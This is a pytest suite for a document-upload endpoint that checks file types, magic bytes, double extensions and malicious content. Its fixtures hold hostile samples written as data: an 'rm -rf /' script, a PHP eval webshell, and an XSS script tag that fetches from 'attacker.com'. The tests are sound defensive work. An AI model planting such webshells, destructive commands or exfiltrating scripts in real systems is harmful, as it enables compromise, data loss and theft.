import io
import pytest

def register_user(client, admin_headers, email, password):
    client.post("/api/request-access", json={"email": email})
    approve_res = client.post("/api/admin/approve", json={"email": email, "status": "APPROVED"}, headers=admin_headers)
    code = approve_res.json()["secure_code"]
    client.post("/api/register", json={"email": email, "password": password, "secure_code": code})

def test_valid_pdf_and_image_uploads(client, admin_headers, user_headers):
    register_user(client, admin_headers, "alice@trustvault.com", "Password123")

    # 1. Valid PDF
    valid_pdf_bytes = b"%PDF-1.5\n%Header\n1 0 obj\n<<>>\nendobj\ntrailer\n<<>>\n%%EOF"
    res_pdf = client.post(
        "/api/documents/upload",
        files={"file": ("contract.pdf", io.BytesIO(valid_pdf_bytes), "application/pdf")},
        headers=user_headers
    )
    assert res_pdf.status_code == 200
    assert res_pdf.json()["filename"] == "contract.pdf"

    # 2. Valid PNG
    valid_png_bytes = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00"
    res_png = client.post(
        "/api/documents/upload",
        files={"file": ("chart.png", io.BytesIO(valid_png_bytes), "image/png")},
        headers=user_headers
    )
    assert res_png.status_code == 200

    # 3. Valid JPEG
    valid_jpg_bytes = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00\xff\xdb"
    res_jpg = client.post(
        "/api/documents/upload",
        files={"file": ("receipt.jpg", io.BytesIO(valid_jpg_bytes), "image/jpeg")},
        headers=user_headers
    )
    assert res_jpg.status_code == 200

def test_blocked_extensions(client, admin_headers, user_headers):
    register_user(client, admin_headers, "alice@trustvault.com", "Password123")

    dangerous_files = [
        ("malware.exe", b"MZ\x90\x00\x03fake-exe"),
        ("backdoor.php", b"<?php phpinfo(); ?>"),
        ("exploit.sh", b"#!/bin/bash\nrm -rf /"),
        ("script.vbs", b"WScript.Echo 'test'"),
        ("run.bat", b"@echo off\necho hello"),
        ("payload.py", b"import os; os.system('ls')")
    ]

    for filename, content in dangerous_files:
        res = client.post(
            "/api/documents/upload",
            files={"file": (filename, io.BytesIO(content), "application/octet-stream")},
            headers=user_headers
        )
        assert res.status_code == 400, f"Expected 400 Bad Request for {filename}, got {res.status_code}"
        assert "harmful" in res.json()["detail"].lower() or "blocked" in res.json()["detail"].lower() or "unsupported" in res.json()["detail"].lower()

def test_spoofed_extension_magic_byte_validation(client, admin_headers, user_headers):
    register_user(client, admin_headers, "alice@trustvault.com", "Password123")

    # Attacker renames Windows EXE to .pdf
    fake_pdf = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
    res = client.post(
        "/api/documents/upload",
        files={"file": ("fake_invoice.pdf", io.BytesIO(fake_pdf), "application/pdf")},
        headers=user_headers
    )
    assert res.status_code == 400
    assert "spoofed" in res.json()["detail"].lower() or "executable" in res.json()["detail"].lower()

    # Attacker renames text file to .png
    fake_png = b"This is plain text pretending to be a PNG"
    res2 = client.post(
        "/api/documents/upload",
        files={"file": ("fake_photo.png", io.BytesIO(fake_png), "image/png")},
        headers=user_headers
    )
    assert res2.status_code == 400
    assert "png" in res2.json()["detail"].lower()

def test_malicious_script_payload_scanning(client, admin_headers, user_headers):
    register_user(client, admin_headers, "alice@trustvault.com", "Password123")

    # Text file containing embedded webshell / command execution
    webshell_content = b"Some innocent text notes\n<?php eval($_POST['cmd']); ?>\nEnd notes"
    res = client.post(
        "/api/documents/upload",
        files={"file": ("notes.txt", io.BytesIO(webshell_content), "text/plain")},
        headers=user_headers
    )
    assert res.status_code == 400
    assert "harmful" in res.json()["detail"].lower() or "php" in res.json()["detail"].lower()

    # Text file containing script tag injection
    xss_content = b"Report summary <script>fetch('http://attacker.com/steal')</script>"
    res2 = client.post(
        "/api/documents/upload",
        files={"file": ("audit.txt", io.BytesIO(xss_content), "text/plain")},
        headers=user_headers
    )
    assert res2.status_code == 400
    assert "harmful" in res2.json()["detail"].lower() or "script" in res2.json()["detail"].lower()

def test_empty_file_rejected(client, admin_headers, user_headers):
    register_user(client, admin_headers, "alice@trustvault.com", "Password123")

    res = client.post(
        "/api/documents/upload",
        files={"file": ("empty.pdf", io.BytesIO(b""), "application/pdf")},
        headers=user_headers
    )
    assert res.status_code == 400
    assert "empty" in res.json()["detail"].lower()

def test_dangerous_double_extension_blocked(client, admin_headers, user_headers):
    register_user(client, admin_headers, "alice@trustvault.com", "Password123")

    res = client.post(
        "/api/documents/upload",
        files={"file": ("statement.exe.pdf", io.BytesIO(b"%PDF-valid"), "application/pdf")},
        headers=user_headers
    )
    assert res.status_code == 400
    assert "double extension" in res.json()["detail"].lower()
